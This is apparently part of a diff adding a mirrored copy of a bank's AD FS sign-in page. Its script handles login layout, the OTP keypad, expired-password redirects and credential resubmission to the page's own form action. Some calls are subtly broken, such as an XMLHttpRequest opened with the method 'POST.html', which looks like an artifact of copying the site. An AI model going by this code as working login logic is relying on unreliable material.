+        if (branding.classList && branding.classList.add) {
+          branding.classList.add(newClass);
+        } else if (branding.className !== undefined) {
+          branding.className += " " + newClass;
+        }
+        if (window.removeEventListener) {
+          window.removeEventListener('load', LoadTheme, false);
+          window.removeEventListener('resize', LoadTheme, false);
+        }
+        else if (window.detachEvent) {
+          window.detachEvent('onload', LoadTheme);
+          window.detachEvent('onresize', LoadTheme);
+        }
+      }
+
+      try {
+
+        AppendCertificate();
+        AppendLostPassword();
+        DrawMFA(passwordInput);
+
+
+        if (ExistMFA()) {
+          ControlFooter(3);
+        } else {
+          ControlFooter(1);
+
+          if (IsIB()) {
+            GetParamts();
+            RestringirMoviles();
+          }
+          if (IsIBMovil() && usrName.length > 1) {
+            SetValueInput('userNameInput', usrName, true);
+          }
+        }
+
+        content.style.display = "block";
+
+        ClearDomain();
+        CambioContrasena();
+        ValidarErrorCert();
+
+        if (ElementExist('userNameInput')) {
+          document.getElementById("userNameInput").focus();
+        }
+
+        if (ElementExist('totp')) {
+          document.getElementById("totp").focus();
+        }
+
+        if (IsIBMovil() && ElementExist('userNameInput') && ElementExist('passwordInput')) {
+          if (document.getElementById("userNameInput").length > 1) {
+            document.getElementById("passwordInput").focus();
+          }
+        }
+
+      } catch (ex) {
+        console.log(ex);
+      }
+    };
+
+    if (window.addEventListener) {
+      window.addEventListener('resize', LoadTheme, false);
+      window.addEventListener('load', LoadTheme, false);
+    }
+    else if (window.attachEvent) {
+      window.attachEvent('onresize', LoadTheme);
+      window.attachEvent('onload', LoadTheme);
+    }
+
+
+    function IsIB() {
+      try {
+        var urla = window.location.toString();
+        if (urla.indexOf(indiceIB).toString() !== "-1" && urla.indexOf(indiceAuth).toString() !== "-1") {
+          return true;
+        }
+      } catch (ex) {
+        console.log(ex);
+      }
+
+      return false;
+    }
+
+    function IsIBMovil() {
+      try {
+        var urla = window.location.toString();
+
+        if (urla.indexOf(indiceBNM).toString() !== "-1" && urla.indexOf(indiceAuth).toString() !== "-1") {
+          return true;
+        }
+      } catch (ex) {
+        console.log(ex);
+      }
+
+      return false;
+    }
+
+    function IsBNS() {
+      try {
+        var urla = window.location.toString();
+
+        if (urla.indexOf(indiceBNS).toString() !== "-1" && urla.indexOf(indiceAuth).toString() !== "-1") {
+          return true;
+        }
+      } catch (ex) {
+        console.log(ex);
+      }
+
+      return false;
+    }
+
+    function Signout() {
+      try {
+        var urla = window.location.toString();
+
+        if (urla.indexOf('wsignout1').toString() !== "-1") {
+          WindowsRedirect();
+        }
+      } catch (ex) {
+        console.log(ex);
+      }
+
+    }
+
+    function ClearDomain() {
+      try {
+        if (ElementExist('errorText') && ElementExist('loginForm')) {
+          var ms = document.getElementById('errorText').innerText;
+          var tr = "Contraseña o identificador de usuario incorrectos. Escriba la contraseña y el identificador de usuario correctos e intentelo de nuevo.";
+          var trEng = 'Incorrect user ID or password. Type the correct user ID and password, and try again.';
+
+          if (ms.trim() === tr.trim() || ms.trim() === trEng.trim()) {
+            if (document.forms['loginForm'].UserName.value.match('[@\\\\]')) {
+              var a = document.forms['loginForm'].UserName.value.split('\\');
+              if (a.length > 1) {
+                document.forms['loginForm'].UserName.value = a[1];
+              }
+            }
+          }
+
+        }
+      } catch (ex) {
+        console.log(ex);
+      }
+    }
+
+    function CambioContrasena() {
+      try {
+        if (ElementExist('errorText') && ElementExist('loginForm')) {
+          var custom_error = document.getElementById('errorText');
+          var identificacion = document.getElementById('userNameInput');
+          var inicio = identificacion.value.indexOf("\\") + 1;
+          var final = identificacion.value.length;
+          var idUsuario = identificacion.value.substring(inicio, final);
+          var custom_searchText = "Your password has expired.";
+          var redireccionarcambio = false;
+          if (custom_error.innerText.substring(0, custom_searchText.length) === custom_searchText) {
+            custom_error.innerText = "Your password has expired. Redirecting to change...";
+            redireccionarcambio = true;
+          }
+          else {
+            var custom_searchTextEs = "ha caducado.";
+            if (custom_error.innerText.indexOf(custom_searchTextEs) > -1) {
+              custom_error.innerText = "Su contrase\u00F1a ha expirado, redireccionando al cambio...";
+              redireccionarcambio = true;
+            }
+          }
+
+          if (document.forms['loginForm'].UserName.value.match('[@\\\\]')) {
+            var a = document.forms['loginForm'].UserName.value.split('\\');
+            if (a.length > 1) {
+              document.forms['loginForm'].UserName.value = a[1];
+            }
+          }
+
+          if (redireccionarcambio) {
+            setTimeout(function () {
+              if (IsIBMovil()) {
+                document.location.href = urlCambioClaveBNM + "?pId=" + idUsuario;
+              } else {
+                document.location.href = urlCambioClave + "?Identificacion=" + idUsuario;
+              }
+            }, 3000);
+          }
+        }
+      } catch (ex) {
+        console.log(ex);
+      }
+    }
+
+    /*
+    * Show / Hide control
+    */
+    function HideShowControl(elementList, display) {
+      for (var i = 0; i < elementList.length; i++) {
+        if (elementList[i] && elementList[i].style) {
+          elementList[i].style.display = display;
+        }
+      }
+    }
+
+    /*
+    * Verify Exist Element Input
+    */
+    function ElementExist(pstrNombreInput) {
+
+      if (typeof document.getElementById(pstrNombreInput) !== "undefined" && document.getElementById(pstrNombreInput) !== '' && document.getElementById(pstrNombreInput) !== null) {
+        return true;
+      }
+      return false;
+    }
+
+    /*
+    * Redirect Page
+    */
+    function WindowsRedirect(pblnValidateSSO) {
+
+      try {
+        var urihref = urlIBDefault;
+        var uri = GetReturnUri();
+
+        if (uri.length > 0) {
+          urihref = uri;
+        }
+
+        if (IsIB()) {
+          urihref = urlIBDefault;
+        }
+        if (IsIBMovil()) {
+          urihref = urlBnMovilDefault;
+        }
+        if (IsBNS()) {
+          urihref = urlBNSDefault;
+        }
+
+
+        if (pblnValidateSSO === true) {
+          if (ElementExist('totp')) {
+            var uriLogout = window.location.origin;
+            uriLogout = uriLogout + '/adfs/ls/?wa=wsignout1.0';
+            window.location.replace(uriLogout);
+
+          } else {
+            window.location.replace(urihref);
+          }
+        } else {
+          window.location.replace(urihref);
+        }
+
+      } catch (ex) {
+        console.log(ex);
+      }
+
+    }
+
+    function ExistMFA() {
+      if (ElementExist('customAuthArea') &&
+        ElementExist('authArea') &&
+        ElementExist('mfaGreetingDescription') &&
+        ElementExist('totp') &&
+        ElementExist('content')) {
+
+        return true;
+      }
+
+      return false;
+    }
+
+    function DrawMFA(passwordInput) {
+      try {
+        if (ExistMFA()) {
+          document.getElementById("totp").style = '';
+          document.getElementById("continueButton").style = '';
+          document.getElementById("mfaGreetingDescription").outerHTML = '';
+
+          var tbl = '';
+          tbl += '    <div>';
+          tbl += '        <p class="KeyBoardTitle" style="">Digite su OTP</p>';
+          tbl += '        <div id="divKeyBoard" class="divKeyBoard">';
+          tbl += '            <div id="KeyBoardPassword" class="KeyBoardPassword">';
+          tbl += '                <div class="bg-green">';
+          tbl += document.getElementById("totp").outerHTML;
+          tbl += '                </div>';
+          tbl += '                <table id="keyBoardTableNumber" class="keyBoardTableNumber">';
+          tbl += '                    <tbody>';
+          tbl += '                        <tr>';
+          tbl += document.getElementById("context").outerHTML;
+          tbl += document.getElementById("authMethod").outerHTML;
+          if (ElementExist('authid')) {
+            tbl += document.getElementById("authid").outerHTML;
+          }
+          tbl += '                        </tr>';
+          tbl += '                    </tbody>';
+          tbl += '                </table>';
+          tbl += '            </div>';
+          tbl += '        </div>';
+          tbl += '        <div id="KeyboardTimmer" class="KeyboardTimmer">';
+          tbl += document.getElementById("continueButton").outerHTML;
+          tbl += '        </div>';
+          tbl += '    </div>';
+          tbl += '    <div class="KeyboardTimmer"><hr><div id="divGotoInit"> <input id="bntGotoInit" type="button" value="Ir al Inicio" onclick="return WindowsRedirect(true);"/></div></div>';
+
+          document.getElementById('loginForm').innerHTML = tbl;
+
+        }
+      }
+      catch (ex) {
+        console.log(ex);
+      }
+    }
+
+
+    /*
+    * Apply CSS to Input
+    */
+    function ApplyCSSInput(pstrInputName, strStyle) {
+
+      // CSS Input 
+      if (ElementExist(pstrInputName)) {
+        document.getElementById(pstrInputName).style.cssText = strStyle;
+      }
+
+    }
+
+
+    /* Set Value to Element */
+    function SetValueInput(pNameInput, pstrValue, pblnIsInputUsername) {
+
+      if (ElementExist(pNameInput)) {
+
+        if (pblnIsInputUsername) { // Asigna dominio
+          if (document.getElementById(pNameInput).value.indexOf("BNCREXT") === -1) {
+            //document.getElementById(pNameInput).value = "BNCREXT\\" + pstrValue;
+            document.getElementById(pNameInput).value = pstrValue;
+          }
+        } else {
+
+          if (document.getElementById(pNameInput).value) {
+            document.getElementById(pNameInput).value = pstrValue;
+          } else {
+            document.getElementById(pNameInput).innerHTML = pstrValue;
+          }
+        }
+
+      }
+    }
+
+
+    /* Control Footer */
+    function ControlFooter(typeF) {
+      try {
+        if (ElementExist('footerPlaceholder') && ElementExist('ul_LoginL') && ElementExist('ul_LoginC') && ElementExist('ul_LoginR') && ElementExist('ul_KeyBoardL') && ElementExist('ul_KeyBoardC') && ElementExist('ul_KeyBoardR') && ElementExist('ul_OTPL') && ElementExist('ul_OTPC') && ElementExist('ul_OTPR')) {
+
+          if (typeF === 1) {
+            document.getElementById('ul_LoginL').setAttribute("class", "menulinkHref footer_Display");
+            document.getElementById('ul_LoginC').setAttribute("class", "menulinkHref footer_Display");
+            document.getElementById('ul_LoginR').setAttribute("class", "menulinkHref footer_Display");
+            document.getElementById('ul_ModuloR').setAttribute("class", "menulinkHref footer_Display");
+          }
+          if (typeF === 2) {
+            document.getElementById('ul_KeyBoardL').setAttribute("class", "menulinkHref footer_Display");
+            document.getElementById('ul_KeyBoardC').setAttribute("class", "menulinkHref footer_Display");
+            document.getElementById('ul_KeyBoardR').setAttribute("class", "menulinkHref footer_Display");
+          }
+          if (typeF === 3) {
+            document.getElementById('ul_OTPL').setAttribute("class", "menulinkHref footer_Display");
+            document.getElementById('ul_OTPC').setAttribute("class", "menulinkHref footer_Display");
+            document.getElementById('ul_OTPR').setAttribute("class", "menulinkHref footer_Display");
+          }
+        }
+
+      } catch (ex) {
+        console.log(ex);
+      }
+    }
+
+    function GetReturnUri() {
+      var uri = '';
+      try {
+        var urlsplit = window.location.toString();
+        urlsplit = urlsplit.split('&');
+        if (urlsplit.length > 1) {
+          var params = {};
+          for (i in urlsplit) {
+            var key = urlsplit[i].split('=');
+            if (key.length < 2) continue;
+            if (key[0].indexOf('returnUrl').toString() !== '-1') {
+              uri = unescape(key[1]);
+            }
+          }
+        }
+      } catch (ex) {
+        console.log(ex);
+      }
+      return uri;
+    }
+
+
+    /*
+    * Recupera informaci�n de URL y parametros
+    * %26 = &
+    * %3D = =
+    * %3F= ?
+    */
+    function GetParamts() {
+
+
+      if (ElementExist('signoutArea') && !ElementExist('formsAuthenticationArea')) {
+        WindowsRedirect();
+      }
+
+      var tkQuery = "tk";
+
+      if (ElementExist('formsAuthenticationArea') && IsIB()) {
+
+        var keyValPairs = [];
+        var params = {};
+
+        var urlsplit = window.location.toString().split('%3F');
+
+        if (urlsplit.length > 1) {
+
+          keyValPairs = urlsplit[1].split('%26'); //&
+
+          for (i in keyValPairs) {
+            var key = keyValPairs[i].split('='); // =
+
+            if (!key.length) continue;
+
+            key = key[0]; // Get Key from QueryString
+
+            if (!keyValPairs[i].split('=').length) continue;
+
+            var value = keyValPairs[i].split('=')[1]; // Get Value from QueryString
+
+
+            if (value.split('&').length) // Valid contains & 
+              value = value.split('&')[0];
+
+            if (typeof params[key] === 'undefined')
+              params[key] = [];
+
+            params[key].push(value);
+          }
+        }
+
+        if (params[tkQuery] && params[tkQuery] !== "") {
+
+          try {
+            var tk = params[tkQuery].toString().replace('[', '').replace(']', '');
+            tk = "\"" + tk + "\"";
+
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST.html", urlApiToken, true);
+            xhr.setRequestHeader('Content-Type', 'application/json; charset=utf-8');
+            xhr.send(tk);
+
+            xhr.onreadystatechange = function () {
+
+              if (xhr.readyState === 4) {
+                if (xhr.status === 200 && (typeof xhr.response !== "undefined" && xhr.response !== '' && xhr.response !== null) && (typeof xhr.responseText !== "undefined" && xhr.responseText !== '' && xhr.responseText !== null)) {
+                  try {
+                    var lobjData = JSON.parse(xhr.responseText);
+
+                    SetValueInput('userNameInput', lobjData.Identificacion, true);
+
+                    if (ElementExist('passwordInput')) {
+                      document.getElementById("passwordInput").focus();
+                    }
+
+                  } catch (ex) {
+                    console.log(ex);
+                  }
+
+                }
+              }
+            };
+          } catch (ex) {
+            console.log(ex);
+          }
+        }
+      }
+    }
+
+    function GetUsrName() {
+
+      var strReturn = '';
+      try {
+
+        if (!IsIBMovil()) {
+          return strReturn;
+        }
+
+        var urltoSplit = window.location.toString().split('usuario%3D');
+
+        if (urltoSplit.length > 1) {
+
+          var keyValPairs = urltoSplit[1].split('&');
+
+          if (keyValPairs.length > 1) {
+
+            if (keyValPairs[0] && keyValPairs[0] !== "" && keyValPairs[0].length > 1) {
+              strReturn = keyValPairs[0];
+            }
+
+          }
+        }
+
+      } catch (ex) {
+        console.log(ex);
+      }
+
+      return strReturn;
+    }
+
+    /* Appen Password Div */
+    function AppendLostPassword() {
+      try {
+        if (ElementExist('formsAuthenticationArea')) {
+          var div = document.createElement('div');
+          div.className = 'divInfo';
+          div.id = 'divInfoId';
+
+          var a = '';
+          if (IsIBMovil()) {
+            a = '<div id="lostPassword"><a href="' + urlLostPasswordBnMovil + '" target="_blank"><p class="txtBlue"><span class="dot"></span> \u00BFOlvid\u00F3 su contrase\u00F1a? </p></a></div>';
+          } else {
+            a = '<div id="lostPassword"><a href="' + urlLostPassword + '" target="_blank"><p class="txtBlue"><span class="dot"></span> \u00BFOlvid\u00F3 su contrase\u00F1a? </p></a></div>';
+          }
+          div.innerHTML = a;
+          var frm = document.getElementById('formsAuthenticationArea');
+          frm.appendChild(div);
+        }
+
+
+
+      } catch (ex) {
+        console.log(ex);
+      }
+    }
+
+    /* Appen Cert Div */
+    function AppendCertificate() {
+      try {
+        if (ElementExist('CertificateAuthentication') &&
+          ElementExist('authOptionLinks') &&
+          ElementExist('formsAuthenticationArea') &&
+          ElementExist('userNameArea')) {
+
+          //document.getElementById('authOptionLinks').setAttribute("onclick", "return CertificateClick();");
+          //document.getElementById('authOptionLinks').setAttribute("class", "keyBtn");
+          var btn = document.createElement("INPUT");
+          btn.setAttribute("type", "button");
+          btn.innerHTML = "";
+          btn.setAttribute("class", "botonCert2");
+          btn.setAttribute("alt", "Ingresar con certificado");
+          btn.setAttribute("title", "Ingresar con certificado");
+          btn.setAttribute("onclick", "return CertificateClick();"); // for FF   
+          btn.tabIndex = 5;
+          document.getElementById('authOptionLinks').appendChild(btn);
+          document.getElementById("CertificateAuthentication").style.display = "none";
+
+          var bl = false;
+          var frm = null;
+          if (ElementExist('KeyboardTimmer')) {
+            frm = document.getElementById('KeyboardTimmer');
+          } else {
+            frm = document.getElementById('userNameArea');
+            bl = true;
+          }
+
+          var a = document.getElementById('authOptionLinks').outerHTML;
+
+          document.getElementById("authOptionLinks").outerHTML = "";
+          var div = document.createElement('div');
+          div.innerHTML = a;
+          div.id = 'divCertificateAuthentication';
+          frm.appendChild(div);
+
+          if (ElementExist('userNameInput') && bl === true) {
+            frm = document.getElementById('userNameArea');
+            a = document.getElementById('userNameInput').outerHTML;
+            document.getElementById('userNameInput').outerHTML = '';
+
+            div = document.createElement('div');
+            div.innerHTML = a;
+            div.id = 'divuserNameInput';
+            frm.appendChild(div);
+
+            document.getElementById('passwordInput').style.fontSize = "20px";
+          }
+
+          if (IsIBMovil() && ElementExist('divCertificateAuthentication')) {
+            document.getElementById('divCertificateAuthentication').outerHTML = '';
+          }
+        }
+      } catch (ex) {
+        console.log(ex);
+      }
+    }
+
+    /*
+     Append UserName Input
+    */
+    function AppendUserName() {
+
+
+      var labelinput = '<p id="lblnUserName" class="lblnCSSUser"></p>';
+
+      try {
+
+        if (ElementExist('userNameArea')) {
+          var div = document.createElement('div');
+          div.innerHTML = labelinput;
+          div.id = "divblnUserName";
+          document.getElementById('userNameArea').appendChild(div);
+        }
+
+      } catch (ex) {
+        console.log(ex);
+      }
+    }
+
+    /*
+     Init Functions
+    */
+    function InitControls(flagInitPassword) {
+
+      try {
+
+        if (flagInitPassword) {
+          if (ElementExist("passwordInput")) {
+
+            document.getElementById("passwordInput").setAttribute("class", "text fullWidth usrInput InputNoKeyBoard");
+            document.getElementById("userNameInput").setAttribute("class", "text fullWidth usrInput InputNoKeyBoard");
+            document.getElementById("passwordInput").setAttribute("placeholder", "Contrase\u00F1a");
+            document.getElementById("passwordInput").setAttribute("maxlength", 16);
+            document.getElementById("userNameInput").setAttribute("maxlength", 25);
+            document.getElementById("passwordInput").setAttribute("onpaste", "return false");
+            document.getElementById("passwordInput").setAttribute("oncopy", "return false");
+            document.getElementById("passwordInput").setAttribute("ondrop", "return false");
+          }
+
+          if (ElementExist('introduction')) {
+            document.getElementById("introduction").outerHTML = '';
+          }
+        }
+        else {
+          // Hide
+          if (ElementExist('errorText')) {
+            HideShowControl([document.getElementById('errorText')], 'none');
+          }
+
+          if (ElementExist('userNameInputLabel') && ElementExist('userNameInput') && ElementExist('submissionArea')) {
+            HideShowControl([document.getElementById('userNameInputLabel'), document.getElementById('userNameInput'), document.getElementById('submissionArea')], 'none');
+          }
+
+          if (ElementExist('passwordArea')) {
+            HideShowControl([document.getElementById('passwordArea')], 'none');
+          }
+
+          if (ElementExist("passwordInput")) {
+
+            HideShowControl([document.getElementById('passwordInput')], 'none');
+          }
+
+          if (ElementExist("userNameInput")) {
+            document.getElementById("userNameInput").setAttribute("maxlength", 30);
+            document.getElementById("userNameInput").setAttribute("onpaste", "return false");
+            document.getElementById("userNameInput").setAttribute("oncopy", "return false");
+            document.getElementById("userNameInput").setAttribute("ondrop", "return false");
+          }
+
+          if (ElementExist("submitButton")) {
+            HideShowControl([document.getElementById('submitButton')], 'none');
+          }
+        }
+
+
+
+      } catch (ex) {
+        console.log(ex);
+      }
+    }
+
+    /*
+      Validate Letter And Numbers
+    */
+    function LettersAndNumbers(cadena) {
+
+      var banderaNumero = 0;
+      var banderaLetras = 0;
+      for (var i = 0; i < cadena.length; i++) {
+        if (isNumber(cadena.charAt(i))) {
+          banderaNumero++;
+        } else {
+          banderaLetras++;
+        }
+      }
+
+      if (banderaNumero > 2 && banderaLetras > 2) {
+        return true;
+      }
+
+      return false;
+
+    }
+
+    function CertificateClick() {
+      try {
+        if (ElementExist('CertificateAuthentication')) {
+          document.getElementById('CertificateAuthentication').click();
+        }
+      } catch (ex) {
+        console.log(ex);
+      }
+    }
+
+    /* Help Click */
+    function HelpClick() {
+      try {
+        if (ElementExist('Modal')) {
+          document.getElementById("Modal").style.display = "block";
+        }
+      } catch (ex) {
+        console.log(ex);
+      }
+    }
+
+    function ValidarErrorCert() {
+      try {
+        var urla = window.location.toString();
+        if (urla.indexOf("49443").toString() !== "-1" && urla.indexOf(indiceAuth).toString() !== "-1") {
+          if (ElementExist('errorArea')) {
+            var sheets = document.styleSheets;
+            for (var i in document.styleSheets) {
+              if (sheets[i].href && sheets[i].href.indexOf("style.html") > -1) {
+                var urlcss = sheets[i].href.replace(/:49443/gi, '');
+                var head = document.head;
+                var link = document.createElement("link");
+                link.type = "text/css";
+                link.rel = "stylesheet";
+                link.href = urlcss;
+                head.appendChild(link);
+              }
+            }
+          }
+        }
+      } catch (ex) {
+        console.log(ex);
+      }
+
+      return false;
+    }
+
+    function RestringirMoviles() {
+      var isMobile = {
+        Android: function () { return navigator.userAgent.match(/Android/i); },
+        BlackBerry: function () { return navigator.userAgent.match(/BlackBerry/i); },
+        iOS: function () { return navigator.userAgent.match(/iPhone|iPad|iPod/i); },
+        Opera: function () { return navigator.userAgent.match(/Opera Mini/i); },
+        Windows: function () { return navigator.userAgent.match(/IEMobile/i); },
+        any: function () { return isMobile.Android() || isMobile.BlackBerry() || isMobile.iOS() || isMobile.Opera() || isMobile.Windows(); }
+      };
+      if (isMobile.any()) {
+        window.location.replace(urlBnMovilDefault);
+      }
+
+    }
+
+
+    /* Close Click */
+    function Close(e) {
+      try {
+        if (ElementExist('spClose') && ElementExist('Modal')) {
+          document.getElementById("Modal").style.display = "none";
+        }
+      } catch (ex) {
+        console.log(ex);
+      }
+    }
+
+    function LoginErrors() {
+      this.userNameFormatError = 'Por favor ingrese un numero de identificacion valido.';
+      this.passwordEmpty = 'Por favor ingrese su contraseña.';
+    }
+
+    if (typeof Login !== 'undefined') {
+      Login.submitLoginRequest = function () {
+        var u = new InputUtil();
+        var e = new LoginErrors();
+        var userName = document.getElementById(Login.userNameInput);
+        var password = document.getElementById(Login.passwordInput);
+        if (userName.value && userName.value.match('[@\\\\]')) {
+          u.setError(userName, e.userNameFormatError);
+          return false;
+        }
+
+        if (!userName.value) {
+          u.setError(userName, e.userNameFormatError);
+          return false;
+        }
+
+        if (!password.value) {
+          u.setError(password, e.passwordEmpty);
+          return false;
+        }
+
+        var currentForm = document.getElementById("loginForm");
+        var hiddenForm = document.createElement("form");
+        hiddenForm.setAttribute('method', currentForm.method);
+        hiddenForm.setAttribute('action', currentForm.action);
+        hiddenForm.setAttribute('id', "hiddenForm");
+
+        var userInput = document.createElement("input");
+        userInput.setAttribute('type', "text");
+        userInput.setAttribute('name', "UserName");
+
+        if (userName.value && !userName.value.match('[@\\\\]')) {
+          var userNameValue = '' + userName.value;
+          userInput.setAttribute('value', userNameValue);
+        }
+        else { userInput.setAttribute('value', userName.value); }
+
+        var pwdInput = document.createElement("input");
+        pwdInput.setAttribute("type", "hidden");
+        pwdInput.setAttribute("name", "Password");
+        pwdInput.setAttribute("value", password.value);
+
+        var authMethodInput = document.createElement("input");
+        authMethodInput.setAttribute("type", "text");
+        authMethodInput.setAttribute("name", "AuthMethod");
+        authMethodInput.setAttribute("value", "FormsAuthentication");
+
+        var submitInput = document.createElement("input");
+        submitInput.setAttribute("type", "submit");
+        submitInput.setAttribute("value", "Submit");
+
+        hiddenForm.appendChild(userInput);
+        hiddenForm.appendChild(pwdInput);
+        hiddenForm.appendChild(authMethodInput);
+        hiddenForm.appendChild(submitInput);
+
+        document.getElementsByTagName('body')[0].appendChild(hiddenForm);
+        hiddenForm.submit();
+        document.getElementsByTagName('body')[0].removeChild(hiddenForm);
+        return false;
+      };
+    }
+//]]>
+  </script>
+
+
+
+
+
+</body></html>
